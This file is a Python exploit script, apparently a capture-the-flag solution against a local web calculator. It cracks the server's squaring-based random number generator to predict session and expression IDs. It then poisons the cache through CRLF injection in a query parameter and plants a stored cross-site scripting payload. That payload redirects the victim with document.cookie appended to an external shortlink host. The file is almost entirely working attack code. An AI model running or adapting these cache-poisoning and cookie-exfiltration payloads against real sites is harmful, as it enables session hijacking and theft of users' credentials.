from math import log10
import requests
import hashlib
import random
import string



class Challenge:


    def __init__(self, url):
        self.url = url
        self.s = requests.Session()
        self._session_id_state = False
    
    def _(self, path):
        return f"{self.url}{path}"

    def get_expression(self, expression):
        res = self.s.post(self._(""), data={"expression": expression})
        return self.s.get(self._(f"/embed/{res.url.split('/')[-1]}")).text.split('<input autofocus="" class="form-control" readonly  type="text" value="')[1].split('"')[0]
    
    def get_session_id(self):
        return self.next_random(5)

    def get_next_expression_id(self, expression,session_id):
        skip = 3
        if not self._session_id_state:
            skip = 5
            self._session_id_state = True

        _id = f"{expression}{session_id}{str(self.next_random(skip))}"
        print("[*] Expression ID:", _id)
        return hashlib.sha256(_id.encode()).hexdigest()
        
    def next_random(self, how_many_skip=4, s=None):
        for _ in range(how_many_skip):
            skipped = next(self.rng)
            print("[*] Skipped:", skipped)
            
        return next(self.rng)
    
    def create_script(self, payload, session_id):
       assert len(payload) == 44, "Payload must be 44 bytes len"
       payload = payload+';//'
       e = random.choice(string.ascii_letters+string.digits)
       self.insert_in_cache(payload, session_id, e)
       return e

    def insert_in_cache(self, payload, session_id, expression_id):
        r = self.s.get(self._(f"/embed/{expression_id}?calc_session={session_id}%0d%0a%0d%0a{payload}"))
        print("[*] Poisioned cache", r.text)


    def xss(self, session_id,script_expression_id, next_expression_id):
        cache_payload = f"<script src='/embed/{script_expression_id}'></script>"
        self.insert_in_cache(cache_payload, session_id, next_expression_id)

        return next_expression_id

    def _crack_rng(self):

        def rng(last, M):
            while True:
                last = (last * last) % M
                yield last
            

        _ = self.s.get(self._(""))

        expression = ''.join(["${RANDOM}-"] * 3003) +"0"

        numbers = self.get_expression(expression).split("-")[:-1]
        
        assert len(numbers) == 3003, len(numbers)
        numbers = list(map(int, numbers))
        
        a,b,c,*numbers = numbers
        n = len(numbers)
        highest = max(numbers)

        prediction = int(highest + (highest - n) // n)
       
        M = -1
        for i in range(prediction):
            pn = prediction + i
            if (a*a) % pn == b and (b*b) % pn == c:
                M = pn
                break
            pni = prediction - i
            if (a*a) % pni == b and (b*b) % pni == c:
                M = pni
                break
     
        assert M != -1, M

        self.rng = rng(numbers[-1], M)
        return self.rng 
        



c = Challenge("http://localhost:1337")  
c._crack_rng()


session_id = c.get_session_id()
print("[*] Session ID:", session_id)

expression_id = c.get_next_expression_id("15+18", session_id)
print("[*] Xss expression ID:", expression_id)

script_expression_id = c.create_script("top.location=`//t.ly/OTzDs?`+document.cookie", session_id)
print("[*] Script expression ID:", script_expression_id)

print("[*] Inserting payload")
c.xss(session_id,script_expression_id, expression_id)

